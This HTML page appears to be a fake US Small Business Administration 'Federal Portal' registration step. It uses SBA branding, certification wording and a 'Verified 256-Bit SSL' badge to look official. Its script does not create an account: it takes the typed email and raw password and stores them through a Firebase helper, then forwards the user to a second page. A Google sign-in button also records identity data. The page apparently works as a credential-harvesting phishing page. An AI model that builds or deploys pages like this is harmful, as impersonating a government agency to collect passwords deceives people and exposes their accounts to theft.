<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Phase 01: Secure Credentials</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
        
        :root { --sba-navy: #0a192f; --sba-blue: #0071bc; }
        body { background: #f8fafc; font-family: 'Inter', sans-serif; }
        
        .nav-mini { background: white; border-bottom: 1px solid #e2e8f0; padding: 16px 24px; }
        .auth-card { 
            background: white; 
            border-radius: 12px; 
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.05), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            border: 1px solid #eef2f6;
        }
        
        .input-field { 
            height: 52px; 
            border: 1.5px solid #e2e8f0; 
            width: 100%; 
            padding: 0 16px; 
            outline: none; 
            border-radius: 8px; 
            font-size: 14px; 
            font-weight: 500;
            transition: all 0.2s; 
        }
        .input-field:focus { border-color: var(--sba-blue); ring: 4px rgba(0, 113, 188, 0.1); }
        
        .btn-next { 
            background: var(--sba-navy); 
            height: 52px; 
            color: white; 
            width: 100%; 
            font-weight: 800; 
            text-transform: uppercase; 
            font-size: 12px; 
            border-radius: 8px; 
            letter-spacing: 1px; 
            transition: transform 0.2s ease;
        }
        .btn-next:active { transform: scale(0.98); }
        
        .btn-google { 
            border: 1.5px solid #e2e8f0; 
            height: 52px; 
            width: 100%; 
            font-weight: 700; 
            border-radius: 8px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            gap: 12px; 
            background: white; 
            font-size: 13px; 
            transition: background 0.2s;
        }
        .btn-google:hover { background: #f8fafc; }
        
        .step-pill { height: 6px; flex-grow: 1; border-radius: 10px; background: #e2e8f0; }
        .step-pill.active { background: var(--sba-blue); }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <!-- Header -->
    <nav class="nav-mini flex justify-between items-center bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div class="flex items-center gap-3">
            <div class="bg-[#0a192f] text-white px-2.5 py-0.5 font-black text-xl rounded">SBA</div>
            <span class="text-[9px] font-black text-slate-400 uppercase tracking-widest hidden sm:block leading-none">Federal Portal <br> Access Control</span>
        </div>
        <a href="login.html" class="text-[11px] font-black text-slate-500 hover:text-blue-600 uppercase tracking-widest transition">Sign In</a>
    </nav>

    <div class="flex-grow flex items-center justify-center p-6">
        <div class="auth-card p-8 sm:p-10 w-full max-w-[440px]">
            <!-- Progress Bar -->
            <div class="flex gap-3 mb-10">
                <div class="step-pill active"></div>
                <div class="step-pill"></div>
                <div class="step-pill"></div>
            </div>

            <div class="mb-8">
                <h2 class="text-2xl font-black text-slate-900 uppercase tracking-tight">Initialize Case</h2>
                <p class="text-[10px] font-bold text-blue-600 uppercase tracking-[0.2em] mt-2">Stage 01: Secure Credentials</p>
            </div>

            <!-- Social Auth -->
            <button type="button" id="googleRegBtn" class="btn-google shadow-sm mb-8">
                <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" class="w-5">
                <span class="uppercase tracking-wider">Enroll via Google ID</span>
            </button>

            <div class="relative flex pb-8 items-center">
                <div class="flex-grow border-t border-slate-100"></div>
                <span class="flex-shrink mx-4 text-[9px] font-black text-slate-300 tracking-widest">OR MANUAL REGISTRATION</span>
                <div class="flex-grow border-t border-slate-100"></div>
            </div>

            <!-- Form -->
            <form id="step1Form" class="space-y-5">
                <div>
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Business Email Address</label>
                    <input type="email" id="email" class="input-field" required placeholder="admin@enterprise.gov">
                </div>
                <div>
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Create Secure Access Key</label>
                    <input type="password" id="pass" class="input-field" required placeholder="••••••••">
                </div>
                <div>
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Confirm Access Key</label>
                    <input type="password" id="confirm" class="input-field" required placeholder="••••••••">
                </div>

                <div class="flex items-start gap-3 py-2 bg-slate-50 p-3 rounded-lg border border-slate-100">
                    <input type="checkbox" required class="mt-1 w-4 h-4 rounded accent-[#002e6d] cursor-pointer">
                    <p class="text-[10px] font-bold text-slate-500 uppercase leading-relaxed">
                        I certify that I am an authorized representative of this business and accept all 
                        <a href="#" class="text-blue-600 underline">Federal Privacy Terms</a>.
                    </p>
                </div>

                <button type="submit" class="btn-next shadow-xl mt-4">
                    Continue to Application <i class="fas fa-arrow-right ml-2"></i>
                </button>
            </form>
        </div>
    </div>

    <footer class="p-8 text-center">
        <div class="inline-flex items-center gap-2 bg-emerald-50 text-emerald-700 px-4 py-2 rounded-full border border-emerald-100">
            <i class="fas fa-shield-check text-xs"></i>
            <span class="text-[9px] font-bold uppercase tracking-widest">Verified 256-Bit SSL Environment</span>
        </div>
    </footer>

    <script type="module">
        import { auth, saveRegistrationStep } from './firebase-config.js';
        import { signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const form = document.getElementById('step1Form');

        form.onsubmit = (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const confirm = document.getElementById('confirm').value;

            if(pass !== confirm) {
                return alert("Security Error: Access keys do not match. Please verify and try again.");
            }
            
            // Using the upgraded config helper
            saveRegistrationStep({ 
                email: email, 
                password: pass,
                method: 'email',
                timestamp: new Date().toISOString()
            });

            window.location.href = "register2.html";
        };

        document.getElementById('googleRegBtn').onclick = async () => {
            const provider = new GoogleAuthProvider();
            try {
                const res = await signInWithPopup(auth, provider);
                
                saveRegistrationStep({ 
                    email: res.user.email,
                    displayName: res.user.displayName,
                    method: 'google',
                    timestamp: new Date().toISOString()
                });

                window.location.href = "register2.html";
            } catch (err) {
                alert("Authentication Failed: " + err.message);
            }
        };
    </script>
</body>
</html>
